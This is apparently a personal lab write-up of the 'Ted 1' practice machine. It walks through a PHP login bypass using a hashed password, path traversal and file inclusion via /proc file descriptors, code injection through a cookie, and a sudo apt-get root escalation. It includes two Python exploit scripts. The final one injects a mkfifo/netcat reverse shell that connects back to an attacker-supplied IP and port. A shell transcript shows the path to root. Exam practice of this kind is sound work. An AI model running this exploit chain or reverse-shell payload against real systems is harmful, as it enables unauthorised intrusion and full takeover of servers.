# Ted 1

## Nmap
````
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-28 12:44 WEST
Nmap scan report for 10.0.2.35
Host is up (0.00042s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Login
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.71 seconds
````

## Port 80

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/3ec8efbd-65df-48b3-a38f-c494d515c141)


So, the user 'test' shows the following response

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/d7749911-be73-4100-9ce8-5d7a7de814de)

While 'admin' says this

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/08a8661f-73c7-4d1e-b122-3e5af905d5ca)

We know it's a PHP website. There's a neat trick to find this out. If you are on the homepage, try different extensions for index - /index.php, /index.html and so on.
This wasn't required here due to the login request endpoint having the .php extension

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/f0f554c9-c0a9-4b73-8cfe-b7c0ad4f1eb3)

Admin with a random passwords throws the error
``Password or password hash is not correct, make sure to hash it before submit.``

admin : admin gets the following response

``Password hash is not correct, make sure to hash it before submit.``

I tried to guess a bunch of extra parameters (hash, passwordhash, etc...) but without any luck. I then tried a bunch of hashes of the word 'admin' in the password parameter and I finally got something with SHA-256

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/3e625f20-6132-44d4-8a23-9a5615decd39)

Logged in through the front end, and we're in!

## Simple File Browser

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/63663dc8-b89a-49cb-b13e-cc0da4cda553)

LFI + Path Traversal, nice. We know there's a user 'ted' in the box

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/ea3d6f01-5a68-443e-b18f-ba144270b108)


Including the file /proc/self/stat we can find the PID of the current apache process

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/5f0a2ff1-4201-4e7d-aee1-0927106c1d6f)


Through a bit of brute force we found the file descriptor 12 with the cookies content

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/fbce5513-efab-4667-85f5-3c5a7e6235b4)

Now we should inject code in the cookie and brute force the FD again until it's executed on the page (it's constantly changing)

It's painful to keep checking the PID and then brute forcing the FD, there's a time gap that doesn't make this easy. So let's build a script


## Reverse Shell


My regex is not the best, so I came up with this compilation of string.splits to find what I wanted. Here's the code

````
import requests, re


for i in range(0,500):
        # Request with cookies (and test user_pref)
        r = requests.post('http://10.0.2.35/home.php', data={'search':'search=../../../../..../../../../../proc/self/stat'}, cookies = {'PHPSESSID':'1fv378fppsm2rb8s16u8q8nfh4', 'user_pref':'TESTING+INSECURE+DESERIALIZATION'})

        # get PID
        pid = r.text.split(' (apache2)')[0][-4:]

        # loop through the FDs with the just found PID
        r = requests.post('http://10.0.2.35/home.php', data={'search':'search=../../../../..../../../../../proc/'+pid+'/fd/'+str(i)}, cookies = {'PHPSESSID':'1fv378fppsm2rb8s16u8q8nfh4'})

        # if the reponse is slightly larger than usual, grep the deserialized cookie
        if len(r.text) > 1110:
                toPrint = r.text.split('<br><br><br><br><br><br><br><br>')[1].split('</div>')[0]
                print(toPrint)
````

For some reason it doesn't find the file everytime, maybe 0 to 500 FDs isn't enough. Anyway, here's an example of the output:

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/2ccfce4d-6325-4b1f-a808-4e3f8117065c)

This is an insecure PHP object deserialization. I tweaked the payload so the value of the cookie would be the first argument when calling the program from the command line

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/5be16d46-5e2e-42d7-be68-df3761fa818b)

And we got RCE! I am super proud of this since I don't typically build this kind of script. Took me a bit, but IT'S WORKING! :D

Now to the easy part, run it with a reverse shell and wait for the call back

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/ca49e8fc-24cc-4c9f-b599-9b9f43bb675d)



## Privilege Escalation


This should be an easy win

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/f75d502f-0f11-4cc3-bfe1-ee0f26f8835b)

From GTFOBins

![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/9e3ba53c-faf4-4b53-b77e-1d395e28c0fb)


````
www-data@ubuntu:/tmp$ sudo /usr/bin/apt-get changelog apt
Get:1 http://changelogs.ubuntu.com apt 1.2.32 Changelog [411 kB]
Fetched 411 kB in 0s (645 kB/s)
WARNING: terminal is not fully functional
/tmp/apt-changelog-01J2rB/apt.changelog  (press RETURN)
apt (1.2.32) xenial; urgency=medium

  * Add test case for local-only packages pinned to never
  * Prevent shutdown while running dpkg (LP: #1820886)
  * Add linux-{buildinfo,image-unsigned,source} versioned kernel pkgs
    (LP: #1821640)

 -- Julian Andres Klode <juliank@ubuntu.com>  Tue, 07 May 2019 12:57:03 +0200

apt (1.2.31) xenial; urgency=medium

  * Fix name of APT::Update::Post-Invoke-Stats (was ...Update-Post...)
  * apt.dirs: Install auth.conf.d directory (LP: #1818996)
/tmp/apt-changelog-01J2rB/apt.changelog
  * Merge translations from 1.6.10 (via 1.4.y branch)
:

:!/bin/bash
!/bin/bash
root@ubuntu:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:/tmp#
````

Honestly I am okay with these boxes having an easier privesc. The first part of them are usually close to what I am expecting of the OSWE, but there isn't a local privilege escalation step like this in the exam, so that's okay by me.

One of my favorite boxes so far. Again, I'm super happy with the script I built :)

___

I'm back once again. I see I was super proud of that script, and today after looking at it I can confidently say it sucks :D If this happens, it means I'm improving, so no biggie.
I'll probably look back at this new full version and still think it's bad. Anyway, here it is

````
import sys, requests, re

def main():
	# Log in as admin
	session = requests.Session()
	session.cookies["user_pref"] = 'y'
	url = server + "/authenticate.php"
	data = {"username":"admin", "password":"8C6976E5B5410415BDE908BD4DEE15DFB167A9C873FC4BB8A81F6F2AB448A918"}

	r = session.post(url, data=data)

	# Search for current PID
	url = server + "/home.php"
	data = {"search":"../../../../../../proc/self/stat"}

	r = session.post(url, data=data)

	# Save self PID
	pid = re.findall(r"(\d+)(?=\s\(apache2\))", r.text)[0]

	# Iterate over FDs to find where our cookie is injected
	for i in range(1,22):
		session.cookies["user_pref"] = '<%3fphp+system("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/bash+-i+2>%261|nc+{}+{}+>/tmp/f")+%3f>'.format(attacker, port)
		data = {"search" : "../../../../../../../../proc/{}/fd/{}".format(pid,i)}
		r = session.post(url, data=data)
		if "user_pref" in r.text:
			r = session.post(url, data=data)
			print(r.text)
			print("PID: {}, FD: {}".format(pid, i))
			sys.exit()

if __name__ == '__main__':
	try:
		server = sys.argv[1].strip()
		attacker = sys.argv[2].strip()
		port = sys.argv[3].strip()
	except:
		print("[-] Usage: %s serverIP:port attackerIP port!" % sys.argv[0], sys.argv[3])
		sys.exit()
	print("Don't forget to open the listener on port {}!".format(port))
	main()
````
